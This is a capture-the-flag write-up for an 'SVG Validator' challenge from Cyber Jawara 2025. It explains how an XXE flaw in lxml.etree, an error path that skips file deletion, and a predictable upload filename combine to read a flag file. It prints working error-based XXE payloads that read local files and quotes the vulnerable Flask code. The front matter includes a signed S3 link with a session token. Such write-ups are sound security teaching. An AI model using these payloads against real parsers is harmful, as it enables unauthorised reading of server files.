---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466TMOP7QBP%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T092220Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDEaCXVzLXdlc3QtMiJHMEUCIC%2FRtrO6Ltf7enzZ2Dq6khKe1ZM1fgH87ejpilOpxxREAiEAqpgllmnULZdHokNTdlcQI1bB1uPq1F6ddSFiE6sU1BwqiAQI6v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDP%2BVQ%2FURQBjTVTUO3ircA%2BhBm0Fy3cSGnShUjQQHz4G7GVRUiytMV0SwEiBUBMjsw1zQ9Q%2BVeheZ1djpC84su7wYz7C9oQ7VfDwqgMSz%2BdtC1j%2FCzGVvoZwbMqQFCKHplGiOTDTiNa253UbyI91ktYoamYIjxE7IND%2BX7JlGFbZtrJ3Fs0yTNls4S5PwLaIIZhFf%2FSzFz92MqteNZC0itmOJjRNpkb0L6Hjqk5aMkGE9vQe%2B%2B3oDh9hAnmRt0dYh2sDlzJyesQE2zzkvEaKR%2FDIcgF48fPhHJRUO7EC4iY5RiTgnECmMAcN%2B71mSoks5CUUfWooyCpD%2Fs5%2F2yq%2BSqNKwoLrqqppv45XafLCn%2F5QQt84wUQd46Sa5jrCrqeCEpNleXa1VHNTM7fYY8MIYhuZMu5aRo%2Bf0g0fg1ua0X8j%2FhacTvzdND19lGKmfvCANk%2FHp2GoX1McneCms%2F6jiwS%2FaLr5oWXbmOk9JwECUq05u9Ja5BezKgbIlTuzV7H1CLKFvbqWwmdyu4XU4nFuyBbdFuy5u8srYFrOAc5wpyePimsolCpINfnuIxNYHL0x%2BuPzZeKZ2OnzjNy7%2FZB6IOVrovT%2BCUXjz3jWOT3VsnjSIoawJqT0cjsDxNv7ZLuqUQPHuirTFyd6YHW3iMN7xwMEGOqUBcpGbongZkZUbOgqnDp7tPnXG0l5tI%2FCXj1wDd3mWIFy2EO%2F1lebsK5g%2BMGzkvf0KsCvHlORo2HgMTNWkA14DgEvej%2BWFW%2Fn0jyHOoidgEo1PYfk8gTmXWf1ZFf2rugzmwT%2FGcPW1Fq0eVm6wY%2Bqz5fe5qZQd8o3EKvKB7JMMxXTdHuvhm3a6mkQbqAd%2BSpegHzaOjJTBs1H1LSXnNtjoAk%2Bqm7Eq\&X-Amz-Signature=347c848a7b1f95163c721a1b5cc1200193766e5886d17540f37826b5b2919287\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
